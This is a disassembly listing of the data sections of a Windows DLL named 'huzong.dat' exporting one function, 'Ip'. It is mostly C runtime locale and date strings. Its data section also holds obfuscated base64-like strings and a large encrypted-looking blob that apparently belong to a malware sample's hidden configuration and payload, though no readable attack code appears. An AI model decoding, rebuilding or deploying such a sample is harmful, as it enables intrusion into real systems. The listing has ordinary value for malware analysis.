aLc_time	db 'LC_TIME',0          ; DATA XREF: .data:off_43C09Co
aLc_numeric	db 'LC_NUMERIC',0       ; DATA XREF: .data:0043C090o
		align 10h
aLc_monetary	db 'LC_MONETARY',0      ; DATA XREF: .data:0043C084o
aLc_ctype	db 'LC_CTYPE',0         ; DATA XREF: .data:0043C078o
		align 4
aLc_collate	db 'LC_COLLATE',0       ; DATA XREF: .data:off_43C06Co
		align 4
aLc_all		db 'LC_ALL',0           ; DATA XREF: .data:0043C060o
		align 4
; char asc_41149C[2]
asc_41149C	db ';',0                ; DATA XREF: _setlocale+10Ao
					; __setlocale_get_all:loc_407ECFo
		align 10h
; char asc_4114A0[]
asc_4114A0	db '=;',0               ; DATA XREF: _setlocale+9Co
					; _setlocale+164o
		align 4
asc_4114A4	db '=',0                ; DATA XREF: __setlocale_get_all+29o
		align 4
; char a__[4]
a__		db '_.,',0              ; DATA XREF: ___lc_strtolc:loc_4080C5o
; char a_[]
a_		db '.',0                ; DATA XREF: ___lc_lctostr+3Fo
					; ___init_numeric+164o
		align 10h
a__0		db '_',0                ; DATA XREF: ___lc_lctostr+1Bo
		align 4
aParaguay	db 'Paraguay',0         ; DATA XREF: .data:0043C53Co
		align 10h
aUruguay	db 'Uruguay',0          ; DATA XREF: .data:0043C510o
aChile		db 'Chile',0            ; DATA XREF: .data:0043C4E4o
		align 10h
aEcuador	db 'Ecuador',0          ; DATA XREF: .data:0043C4B8o
aArgentina	db 'Argentina',0        ; DATA XREF: .data:0043C48Co
		align 4
aPeru		db 'Peru',0             ; DATA XREF: .data:0043C460o
		align 4
aColombia	db 'Colombia',0         ; DATA XREF: .data:0043C434o
		align 4
aVenezuela	db 'Venezuela',0        ; DATA XREF: .data:0043C408o
		align 4
aDominicanRepub	db 'Dominican Republic',0 ; DATA XREF: .data:0043C3DCo
		align 4
aSouthAfrica	db 'South Africa',0     ; DATA XREF: .data:0043C3B0o
		align 4
aPanama		db 'Panama',0           ; DATA XREF: .data:0043C384o
		align 10h
aLuxembourg	db 'Luxembourg',0       ; DATA XREF: .data:0043C358o
		align 4
aCostaRica	db 'Costa Rica',0       ; DATA XREF: .data:0043C32Co
		align 4
aSwitzerland	db 'Switzerland',0      ; DATA XREF: .data:0043C300o
aGuatemala	db 'Guatemala',0        ; DATA XREF: .data:0043C2D4o
		align 10h
aCanada		db 'Canada',0           ; DATA XREF: .data:0043C2A8o
		align 4
aSpanishModernS	db 'Spanish - Modern Sort',0 ; DATA XREF: .data:0043C274o
		align 10h
aAustralia	db 'Australia',0        ; DATA XREF: .data:0043C250o
		align 4
aEnglish	db 'English',0          ; DATA XREF: .data:0043C248o
					; .data:0043C3A8o
aAustria	db 'Austria',0          ; DATA XREF: .data:0043C224o
aGerman		db 'German',0           ; DATA XREF: .data:0043C21Co
		align 4
aBelgium	db 'Belgium',0          ; DATA XREF: .data:0043C1F8o
aMexico		db 'Mexico',0           ; DATA XREF: .data:0043C1CCo
		align 4
aSpanish	db 'Spanish',0          ; DATA XREF: .data:0043C1C4o
					; .data:0043C2CCo ...
aBasque		db 'Basque',0           ; DATA XREF: .data:0043C198o
		align 4
aSweden		db 'Sweden',0           ; DATA XREF: .data:0043C174o
		align 4
aSwedish	db 'Swedish',0          ; DATA XREF: .data:0043C16Co
aIceland	db 'Iceland',0          ; DATA XREF: .data:0043C148o
aIcelandic	db 'Icelandic',0        ; DATA XREF: .data:0043C140o
		align 4
aFrance		db 'France',0           ; DATA XREF: .data:0043C11Co
		align 10h
aFrench		db 'French',0           ; DATA XREF: .data:0043C114o
					; .data:0043C1F0o ...
		align 4
aFinland	db 'Finland',0          ; DATA XREF: .data:0043C0F0o
aFinnish	db 'Finnish',0          ; DATA XREF: .data:0043C0E8o
aSpain		db 'Spain',0            ; DATA XREF: .data:off_43C0C4o
					; .data:0043C1A0o ...
		align 10h
aSpanishTraditi	db 'Spanish - Traditional Sort',0 ; DATA XREF: .data:off_43C0BCo
		align 4
aUnitedStates	db 'united-states',0    ; DATA XREF: .data:0043C610o
		align 4
aUnitedKingdom	db 'united-kingdom',0   ; DATA XREF: .data:0043C608o
		align 4
aTrinidadTobago	db 'trinidad & tobago',0 ; DATA XREF: .data:0043C5F8o
		align 10h
aSouthKorea	db 'south-korea',0      ; DATA XREF: .data:0043C5F0o
aSouthAfrica_0	db 'south-africa',0     ; DATA XREF: .data:0043C5E8o
		align 4
aSouthKorea_0	db 'south korea',0      ; DATA XREF: .data:0043C5E0o
aSouthAfrica_1	db 'south africa',0     ; DATA XREF: .data:0043C5D8o
		align 4
aSlovak		db 'slovak',0           ; DATA XREF: .data:0043C5D0o
		align 10h
aPuertoRico	db 'puerto-rico',0      ; DATA XREF: .data:0043C5C8o
aPrChina	db 'pr-china',0         ; DATA XREF: .data:0043C5C0o
		align 4
aPrChina_0	db 'pr china',0         ; DATA XREF: .data:0043C5B8o
		align 4
aNz		db 'nz',0               ; DATA XREF: .data:0043C5B0o
		align 4
aNewZealand	db 'new-zealand',0      ; DATA XREF: .data:0043C5A8o
aHongKong	db 'hong-kong',0        ; DATA XREF: .data:0043C5A0o
		align 10h
aHolland	db 'holland',0          ; DATA XREF: .data:0043C598o
aGreatBritain	db 'great britain',0    ; DATA XREF: .data:0043C590o
		align 4
aEngland	db 'england',0          ; DATA XREF: .data:0043C588o
aCzech		db 'czech',0            ; DATA XREF: .data:0043C580o
		align 4
aChina		db 'china',0            ; DATA XREF: .data:0043C578o
		align 10h
aBritain	db 'britain',0          ; DATA XREF: .data:0043C570o
aAmerica	db 'america',0          ; DATA XREF: .data:off_43C568o
aUsa		db 'usa',0              ; DATA XREF: .data:0043C820o
aUs		db 'us',0               ; DATA XREF: .data:0043C618o
					; .data:0043C818o
		align 4
aUk		db 'uk',0               ; DATA XREF: .data:0043C600o
					; .data:0043C810o
		align 4
aSwiss		db 'swiss',0            ; DATA XREF: .data:0043C808o
		align 4
aSwedishFinland	db 'swedish-finland',0  ; DATA XREF: .data:0043C800o
aSpanishVenezue	db 'spanish-venezuela',0 ; DATA XREF: .data:0043C7F8o
		align 4
aSpanishUruguay	db 'spanish-uruguay',0  ; DATA XREF: .data:0043C7F0o
aSpanishPuertoR	db 'spanish-puerto rico',0 ; DATA XREF: .data:0043C7E8o
aSpanishPeru	db 'spanish-peru',0     ; DATA XREF: .data:0043C7E0o
		align 4
aSpanishParagua	db 'spanish-paraguay',0 ; DATA XREF: .data:0043C7D8o
		align 10h
aSpanishPanama	db 'spanish-panama',0   ; DATA XREF: .data:0043C7D0o
		align 10h
aSpanishNicarag	db 'spanish-nicaragua',0 ; DATA XREF: .data:0043C7C8o
		align 4
aSpanishModern	db 'spanish-modern',0   ; DATA XREF: .data:0043C7C0o
		align 4
aSpanishMexican	db 'spanish-mexican',0  ; DATA XREF: .data:0043C7B8o
aSpanishHondura	db 'spanish-honduras',0 ; DATA XREF: .data:0043C7B0o
		align 4
aSpanishGuatema	db 'spanish-guatemala',0 ; DATA XREF: .data:0043C7A8o
		align 4
aSpanishElSalva	db 'spanish-el salvador',0 ; DATA XREF: .data:0043C7A0o
aSpanishEcuador	db 'spanish-ecuador',0  ; DATA XREF: .data:0043C798o
aSpanishDominic	db 'spanish-dominican republic',0 ; DATA XREF: .data:0043C790o
		align 4
aSpanishCostaRi	db 'spanish-costa rica',0 ; DATA XREF: .data:0043C788o
		align 10h
aSpanishColombi	db 'spanish-colombia',0 ; DATA XREF: .data:0043C780o
		align 4
aSpanishChile	db 'spanish-chile',0    ; DATA XREF: .data:0043C778o
		align 4
aSpanishBolivia	db 'spanish-bolivia',0  ; DATA XREF: .data:0043C770o
aSpanishArgenti	db 'spanish-argentina',0 ; DATA XREF: .data:0043C768o
		align 4
aPortugueseBraz	db 'portuguese-brazilian',0 ; DATA XREF: .data:0043C760o
		align 10h
aNorwegianNynor	db 'norwegian-nynorsk',0 ; DATA XREF: .data:0043C758o
		align 4
aNorwegianBokma	db 'norwegian-bokmal',0 ; DATA XREF: .data:0043C750o
		align 4
aNorwegian	db 'norwegian',0        ; DATA XREF: .data:0043C748o
		align 4
aItalianSwiss	db 'italian-swiss',0    ; DATA XREF: .data:0043C740o
		align 4
aIrishEnglish	db 'irish-english',0    ; DATA XREF: .data:0043C738o
		align 4
aGermanSwiss	db 'german-swiss',0     ; DATA XREF: .data:0043C730o
		align 4
aGermanLuxembou	db 'german-luxembourg',0 ; DATA XREF: .data:0043C728o
		align 4
aGermanLichtens	db 'german-lichtenstein',0 ; DATA XREF: .data:0043C720o
aGermanAustrian	db 'german-austrian',0  ; DATA XREF: .data:0043C718o
aFrenchSwiss	db 'french-swiss',0     ; DATA XREF: .data:0043C710o
		align 4
aFrenchLuxembou	db 'french-luxembourg',0 ; DATA XREF: .data:0043C708o
		align 10h
aFrenchCanadian	db 'french-canadian',0  ; DATA XREF: .data:0043C700o
aFrenchBelgian	db 'french-belgian',0   ; DATA XREF: .data:0043C6F8o
		align 10h
aEnglishUsa	db 'english-usa',0      ; DATA XREF: .data:0043C6F0o
aEnglishUs	db 'english-us',0       ; DATA XREF: .data:0043C6E8o
		align 4
aEnglishUk	db 'english-uk',0       ; DATA XREF: .data:0043C6E0o
		align 4
aEnglishTrinida	db 'english-trinidad y tobago',0 ; DATA XREF: .data:0043C6D8o
		align 10h
aEnglishSouthAf	db 'english-south africa',0 ; DATA XREF: .data:0043C6D0o
		align 4
aEnglishNz	db 'english-nz',0       ; DATA XREF: .data:0043C6C8o
		align 4
aEnglishJamaica	db 'english-jamaica',0  ; DATA XREF: .data:0043C6C0o
aEnglishIre	db 'english-ire',0      ; DATA XREF: .data:0043C6B8o
aEnglishCaribbe	db 'english-caribbean',0 ; DATA XREF: .data:0043C6B0o
		align 4
aEnglishCan	db 'english-can',0      ; DATA XREF: .data:0043C6A8o
aEnglishBelize	db 'english-belize',0   ; DATA XREF: .data:0043C6A0o
		align 10h
aEnglishAus	db 'english-aus',0      ; DATA XREF: .data:0043C698o
aEnglishAmerica	db 'english-american',0 ; DATA XREF: .data:0043C690o
		align 10h
aDutchBelgian	db 'dutch-belgian',0    ; DATA XREF: .data:0043C688o
		align 10h
aChineseTraditi	db 'chinese-traditional',0 ; DATA XREF: .data:0043C680o
aChineseSingapo	db 'chinese-singapore',0 ; DATA XREF: .data:0043C678o
		align 4
aChineseSimplif	db 'chinese-simplified',0 ; DATA XREF: .data:0043C670o
		align 4
aChineseHongkon	db 'chinese-hongkong',0 ; DATA XREF: .data:0043C668o
		align 10h
aChinese	db 'chinese',0          ; DATA XREF: .data:0043C660o
aChi		db 'chi',0              ; DATA XREF: .data:0043C658o
aChh		db 'chh',0              ; DATA XREF: .data:0043C650o
aCanadian	db 'canadian',0         ; DATA XREF: .data:0043C648o
		align 4
aBelgian	db 'belgian',0          ; DATA XREF: .data:0043C640o
aAustralian	db 'australian',0       ; DATA XREF: .data:0043C638o
		align 10h
aAmericanEnglis	db 'american-english',0 ; DATA XREF: .data:0043C630o
		align 4
aAmericanEngl_0	db 'american english',0 ; DATA XREF: .data:0043C628o
		align 4
aAmerican	db 'american',0         ; DATA XREF: .data:off_43C620o
		align 4
; char aOcp[4]
aOcp		db 'OCP',0              ; DATA XREF: _ProcessCodePage+23o
; char aAcp[4]
aAcp		db 'ACP',0              ; DATA XREF: _ProcessCodePage+12o
aHMmSs		db 'H:mm:ss',0          ; DATA XREF: .data:0043C8D8o
aDdddMmmmDdYyyy	db 'dddd, MMMM dd, yyyy',0 ; DATA XREF: .data:0043C8D4o
aMDYy		db 'M/d/yy',0           ; DATA XREF: .data:0043C8D0o
		align 10h
aPm		db 'PM',0               ; DATA XREF: .data:0043C8CCo
		align 4
aAm		db 'AM',0               ; DATA XREF: .data:0043C8C8o
		align 4
aDecember	db 'December',0         ; DATA XREF: .data:0043C8C4o
		align 4
aNovember	db 'November',0         ; DATA XREF: .data:0043C8C0o
		align 10h
aOctober	db 'October',0          ; DATA XREF: .data:0043C8BCo
aSeptember	db 'September',0        ; DATA XREF: .data:0043C8B8o
		align 4
aAugust		db 'August',0           ; DATA XREF: .data:0043C8B4o
		align 4
aJuly		db 'July',0             ; DATA XREF: .data:0043C8B0o
		align 4
aJune		db 'June',0             ; DATA XREF: .data:0043C8ACo
		align 4
aApril		db 'April',0            ; DATA XREF: .data:0043C8A4o
		align 4
aMarch		db 'March',0            ; DATA XREF: .data:0043C8A0o
		align 4
aFebruary	db 'February',0         ; DATA XREF: .data:0043C89Co
		align 4
aJanuary	db 'January',0          ; DATA XREF: .data:0043C898o
aDec		db 'Dec',0              ; DATA XREF: .data:0043C894o
aNov		db 'Nov',0              ; DATA XREF: .data:0043C890o
aOct		db 'Oct',0              ; DATA XREF: .data:0043C88Co
aSep		db 'Sep',0              ; DATA XREF: .data:0043C888o
aAug		db 'Aug',0              ; DATA XREF: .data:0043C884o
aJul		db 'Jul',0              ; DATA XREF: .data:0043C880o
aJun		db 'Jun',0              ; DATA XREF: .data:0043C87Co
aMay		db 'May',0              ; DATA XREF: .data:0043C878o
					; .data:0043C8A8o
aApr		db 'Apr',0              ; DATA XREF: .data:0043C874o
aMar		db 'Mar',0              ; DATA XREF: .data:0043C870o
aFeb		db 'Feb',0              ; DATA XREF: .data:0043C86Co
aJan		db 'Jan',0              ; DATA XREF: .data:0043C868o
aSaturday	db 'Saturday',0         ; DATA XREF: .data:0043C864o
		align 4
aFriday		db 'Friday',0           ; DATA XREF: .data:0043C860o
		align 4
aThursday	db 'Thursday',0         ; DATA XREF: .data:0043C85Co
		align 10h
aWednesday	db 'Wednesday',0        ; DATA XREF: .data:0043C858o
		align 4
aTuesday	db 'Tuesday',0          ; DATA XREF: .data:0043C854o
aMonday		db 'Monday',0           ; DATA XREF: .data:0043C850o
		align 4
aSunday		db 'Sunday',0           ; DATA XREF: .data:0043C84Co
		align 4
aSat		db 'Sat',0              ; DATA XREF: .data:0043C848o
aFri		db 'Fri',0              ; DATA XREF: .data:0043C844o
aThu		db 'Thu',0              ; DATA XREF: .data:0043C840o
aWed		db 'Wed',0              ; DATA XREF: .data:0043C83Co
aTue		db 'Tue',0              ; DATA XREF: .data:0043C838o
aMon		db 'Mon',0              ; DATA XREF: .data:0043C834o
aSun		db 'Sun',0              ; DATA XREF: .data:off_43C830o
; char aAP[4]
aAP		db 'a/p',0              ; DATA XREF: sub_40A02A:loc_40A145o
; char aAmPm[]
aAmPm		db 'am/pm',0            ; DATA XREF: sub_40A02A:loc_40A12Fo
		align 10h
stru_411C70	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40A562, offset loc_40A566>
					; DATA XREF: ___crtGetStringTypeW+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40A5BF, offset loc_40A5C3> ; SEH scope table for function 40A476
aSunmontuewedth	db 'SunMonTueWedThuFriSat',0
		align 10h
aJanfebmaraprma	db 'JanFebMarAprMayJunJulAugSepOctNovDec',0
		align 4
; char aTz[3]
aTz		db 'TZ',0               ; DATA XREF: __tzset_lk+2Ao
		align 10h
stru_411CD0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40B192, offset loc_40B196>
					; DATA XREF: ___crtGetLocaleInfoW+5o
					; SEH scope table for function 40B0D9
		align 10h
stru_411CE0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40B2AB, offset loc_40B2AF>
					; DATA XREF: ___crtGetLocaleInfoA+5o
					; SEH scope table for function 40B1EC
		align 10h
stru_411CF0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40B876, offset loc_40B87A>
					; DATA XREF: ___crtCompareStringA+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40B8E5, offset loc_40B8E9> ; SEH scope table for function 40B6BF
stru_411D08	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_40BD30>
					; DATA XREF: sub_40BBAD+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_40BE80> ; SEH scope table for function 40BBAD
		dd 0E8h	dup(0)
stru_4120C0	dd 19930520h		; Magic	; DATA XREF: unknown_libname_4o
		dd 1			; Count
		dd offset stru_4120C0.Info; InfoPtr
		dd 0			; CountDtr
		dd 0			; DtrPtr
		dd 3 dup(0)		; _unk
		dd -1			; Info.Id
		dd offset sub_40F8F0	; Info.Proc
		dd 42h dup(0)
;
; Export directory for huzong.dat
;
		dd 0			; Characteristics
		dd 536D9963h		; TimeDateStamp: Sat May 10 03:13:39 2014
		dw 0			; MajorVersion
		dw 0			; MinorVersion
		dd rva aHuzong_dat	; Name
		dd 1			; Base
		dd 1			; NumberOfFunctions
		dd 1			; NumberOfNames
		dd rva off_412218	; AddressOfFunctions
		dd rva off_41221C	; AddressOfNames
		dd rva word_412220	; AddressOfNameOrdinals
;
; Export Address Table for huzong.dat
;
off_412218	dd rva sub_401041	; DATA XREF: .rdata:0041220Co
;
; Export Names Table for huzong.dat
;
off_41221C	dd rva aIp		; DATA XREF: .rdata:00412210o
					; "Ip"
;
; Export Ordinals Table	for huzong.dat
;
word_412220	dw 0			; DATA XREF: .rdata:00412214o
aHuzong_dat	db 'huzong.dat',0       ; DATA XREF: .rdata:004121FCo
aIp		db 'Ip',0               ; DATA XREF: .rdata:off_41221Co
		align 1000h
_rdata		ends

; Section 3. (virtual address 00013000)
; Virtual size			: 0002AD2C ( 175404.)
; Section size in file		: 0002B000 ( 176128.)
; Offset to raw	data for section: 00013000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 413000h
dword_413000	dd 41h dup(0)		; DATA XREF: __cinit+1Fo
dword_413104	dd 41h dup(0)		; DATA XREF: __cinit+1Ao
dword_413208	dd 41h dup(0)		; DATA XREF: __cinit+10o
		dd offset ___initmbctable
		dd 40h dup(0)
		dd offset sub_405C65
		dd 40h dup(0)
dword_413514	dd 41h dup(0)		; DATA XREF: __cinit:loc_4033EEo
dword_413618	dd 41h dup(0)		; DATA XREF: _doexit+6Ao
dword_41371C	dd 41h dup(0)		; DATA XREF: _doexit:loc_4034B5o
dword_413820	dd 41h dup(0)		; DATA XREF: _doexit+7Bo
		dd offset sub_405C76
		dd 40h dup(0)
dword_413A28	dd 42h dup(0)		; DATA XREF: _doexit:loc_4034C6o
		dd 0AAAAAAAAh
; CHAR aXflqwever2lbxk[]
aXflqwever2lbxk	db 'XFlqWEVeR2lBXkcQEBEeRhMTEhIeX1JHIA==',0 ; DATA XREF: sub_4010A0+14o
		align 4
		dd 16h dup(0)
; CHAR aErixhhaeeb4ria[]
aErixhhaeeb4ria	db 'ERIXHhAeEB4RIA==',0 ; DATA XREF: sub_4010A0+22o
		align 4
		dd 1Bh dup(0)
; CHAR aErixhhaeeb4r_0[]
aErixhhaeeb4r_0	db 'ERIXHhAeEB4RIA==',0 ; DATA XREF: sub_4010A0+30o
		align 4
		dd 1Bh dup(0)
; CHAR aDefault[]
aDefault	db 'Default',0          ; DATA XREF: sub_4010A0+3Eo
		dd 0Eh dup(0)
; CHAR asc_413CF4[1]
asc_413CF4	db '╦'                  ; DATA XREF: sub_4010A0+5Do
		db 0F6h, 0C8h, 0CBh
		dd 0E6B0h, 0Eh dup(0)
; CHAR a77b97b8d[]
a77b97b8d	db '77B97B8D',0         ; DATA XREF: sub_4010A0+70o
		align 10h
		dd 0Dh dup(0)
byte_413D74	db 0			; DATA XREF: sub_4010A0+87r
byte_413D75	db 1			; DATA XREF: sub_4010A0+93r
		align 4
dword_413D78	dd 0			; DATA XREF: sub_4010A0+46r
dword_413D7C	dd 7DEh			; DATA XREF: sub_4010A0+6Br
dword_413D80	dd 7DDh			; DATA XREF: sub_4010A0+7Br
dword_413D84	dd 7DDh			; DATA XREF: sub_4010A0+57r
dword_413D88	dd 90001h, 10009h, 1, 60001h, 90001h, 10009h, 1, 60001h
					; DATA XREF: sub_4010A0+C4o
		dd 90001h, 10009h, 1, 60001h, 90001h, 10009h, 1, 60001h
		dd 90001h, 10009h, 1, 60001h, 90001h, 10009h, 1, 60001h
		dd 90001h, 10009h, 1, 60001h, 90001h, 10009h, 1, 60001h
		dd 60h dup(0)
dword_413F88	dd 40h			; DATA XREF: sub_4010A0+B6r
					; sub_4010A0+D6r
		align 10h
byte_413F90	db 0			; DATA XREF: sub_4010A0+A7r
		align 8
		dd 46464952h
dword_413F9C	dd 7FA7B0h, 0FD00EFFEh,	0EFFD00EBh, 0EF02FFh, 0FD00EF45h
					; DATA XREF: sub_401270+40o
		dd 0EFFD00EFh, 0EFFD40h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFC08h, 0F3BAF0F3h, 22F4B4EFh, 4CEE4521h, 9554CE30h
		dd 9FDD7386h, 72889272h, 9E20829Ch, 80936E8Eh, 658DDD74h
		dd 93759DDDh, 0CF9369CFh, 20BCB244h, 98648090h,	0E5F00DC1h
		dd 0EFFD24h, 0FD00EFFDh, 75FCD0A7h, 0C9804C0Ch,	346F5EF1h
		dd 2692B1E3h, 0C98B6A3Ah, 346F5EF3h, 269697D5h,	0C9804C0Eh
		dd 3463428Ah, 2692B1E0h, 0C98E508Fh, 346F5EF2h,	2699AE8Ch
		dd 0C9804C0Dh, 3465419Eh, 2692B1E7h, 0C9845363h, 346F5EF5h
		dd 2698AE0Bh, 0C9804C06h, 346E5EF1h, 2692B0DCh,	0C9DD43CFh
		dd 346F5EEAh, 2699AE0Bh, 0C9804C18h, 34695836h,	2692B1E2h
		dd 0C98453E4h, 346F5EF0h, 879E69BDh, 0C9804C0Ch, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFB850h, 0FD05EEB1h, 0BCC360ECh, 0EFFD00h
		dd 0FD00EFFDh, 0CEF3000Fh, 0E9FC0Bh, 0FD01A5FDh, 0EFFDB0EFh
		dd 0EFFD00h, 0FD01BFB2h, 0EFFD10EFh, 0EE9D00h, 0ED00EFFDh
		dd 0EFFD10EFh, 0EFFF00h, 0FD00EFF9h, 0EFFD00EFh, 0EFFD04h
		dd 0FD00EFFDh, 0EFFF40EFh, 0EFF900h, 0FD00EFFDh, 0EFFD00EDh
		dd 0FFFD00h, 0FD00FFFDh, 0EFED00EFh, 0EFED00h, 0FD00EFFDh
		dd 0EFFD00FFh, 0EE3C50h, 0FD00EFBDh, 0EFFCA637h, 0EFFC40h
		dd 0FD02FFFDh, 0EFFD00FFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD02CFFDh, 0EFFD134Fh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EE9D00h, 0FD00EB29h, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 979874C1h,	0EFFD74h
		dd 0FD01A658h, 0EFFD10EFh, 0EEB700h, 0FD00EBFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 8FFD00CFh, 618B8F2Eh, 0FD008E89h
		dd 0EFFD617Fh, 0EE9D00h, 0FD008DFDh, 0EFFC4EEFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 40EFFD40h, 89618BD3h, 0EFFD008Eh
		dd 0EFCC88h, 0FD013FFDh, 0EFFD14EFh, 0EE4D00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 3D00EFBDh, 9D8E72C1h, 0EFFD63h
		dd 0FD00EFEDh, 0EFFF10EFh, 0EFFF00h, 0FD012BFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0AFFD00AFh, 6C8A8F2Eh,	0FD008C92h
		dd 0EFFD19F1h, 0EDDD00h, 0FD00F5FDh, 0EFFCC6EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 42EFFD40h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0AB55BCACh, 0FBD97464h, 83117657h,	3D331034h
		dd 3E0AAE1Dh, 24AB3A49h, 0FD00EFEDh, 0FA0251EFh, 10EE9FFCh
		dd 0E124AB74h, 0E977E864h, 84EB3983h, 2D84E03Dh, 62FD00EFh
		dd 4464FF7Eh, 3D85FFD9h, 0EF3C85E0h, 4765FD00h,	1CE8BF03h
		dd 6CFD00EFh, 0C06AF9C4h, 0FDAD63F2h, 0A07700EFh, 60F3CFFh
		dd 15F064ACh, 0EFFD0027h, 85EB3983h, 768CE03Dh,	0ECFD00EFh
		dd 0C1E877F0h, 0C03CE91Bh, 0AB3A0A9Ah, 0EEED24h, 0F2EBEFFDh
		dd 0EF5FE8BFh, 0C46CFD00h, 81C06AF9h, 650D0386h, 0E62EFC47h
		dd 763DD3FBh, 64C37531h, 40FFD944h, 7403177Eh, 92ED24ABh
		dd 0C13C7609h, 0A888FF07h, 177E45EFh, 8BE68002h, 0F5F92E36h
		dd 0AAFD4D67h, 7DEE0583h, 0FD5D67F9h, 0EDBA8AAAh, 84EB3A83h
		dd 0A685E03Dh, 402FF10h, 24A37626h, 88C96AEDh, 0AE1550FAh
		dd 83EFFD00h, 3D85EB39h, 37FE0893h, 10CBB98Bh, 0A35F5C16h
		dd 103583B2h, 8B2CA45Bh, 0D618CBB9h, 0B9088B07h, 0FA0250h
		dd 7610EE9Eh, 6CD924BBh, 266F5C4h, 0A35F2976h, 2CA45BB2h
		dd 907F6D90h, 6D907F6Dh, 3FCD0D65h, 3057ED01h, 7910EE2Dh
		dd 65ED7426h, 3AEBD954h, 770C9B37h, 6BBD01A7h, 831B88C9h
		dd 0D0C31035h, 0FFFCD0DFh, 907F6DC3h, 6D907F6Dh, 64AB53BEh
		dd 8DFFD974h, 0AD08CBB9h, 0CBB9C7B9h, 0EFFD10h,	38607FDh
		dd 2B7EFF10h, 8526CE08h, 761F913Dh, 65F524BBh, 0F36FEC1Ch
		dd 0EC1C677Bh, 0E7D95464h, 80FEE18Ah, 0E188083Eh, 27C641FEh
		dd 4C621C7Ch, 0B9C7FFD9h, 0EFFD10CBh, 56BEFD00h, 2FEA415h
		dd 0E7398310h, 0C06A3433h, 0A98BC383h, 0F37710CBh, 881C7D11h
		dd 7611F375h, 65ED24BBh, 0C36FEC1Ch, 0EC1C6785h, 0FFD95464h
		dd 80FEE18Ah, 0E188CF0Eh, 27C641FEh, 4464297Ch,	0A65EFFD9h
		dd 7F6DC3B6h, 907F6D90h, 6D907F6Dh, 7F6D907Fh, 0B8FF1183h
		dd 0FD00EFF9h, 0EBD94466h, 8CBB989h, 0FD24AB70h, 3F6D68BFh
		dd 287ED01h, 280EFFDh, 0EE9D28FAh, 24A37010h, 0D95462F9h
		dd 0A37651E3h, 4462F924h, 0AD52E3D9h, 67950085h, 51FFFCD0h
		dd 9D24FA02h, 0BB7610EEh, 0FFBDFD24h, 0FC60CFE8h, 0CBB98BFFh
		dd 102B7E0Ch, 6D907F3Eh, 7F6D907Fh, 771181h, 3D32EFFDh
		dd 6B0B33B9h, 8DF088C0h, 9704CBB9h, 0A37050DDh,	6485BD24h
		dd 60E8B9ACh, 6AFD003Ah, 0C07AF2C0h, 0F7FE6CBBh, 6EA3DD93h
		dd 0EF65C4h, 6D902CFDh,	7F6D907Fh, 907F6D90h, 0F900037Ch
		dd 2FCE00EFh, 24737653h, 0FD00EBEDh, 64ABCB64h,	4FFD9B4h
		dd 2C8BEFFDh, 2E038BB8h, 0AB1CFFE9h, 1C832576h,	5657F3ECh
		dd 0EFFC00h, 818D2FCEh,	440E0CCBh, 10CB798Bh, 7000EFF9h
		dd 0BFF124A3h, 13F3568h, 0E8FFBEEDh, 0FFFC63A3h, 6ABCFD6Ah
		dd 0FC6AB9FDh, 0C3D95462h, 13F3D68h, 0FF68BDEDh, 77D00EFh
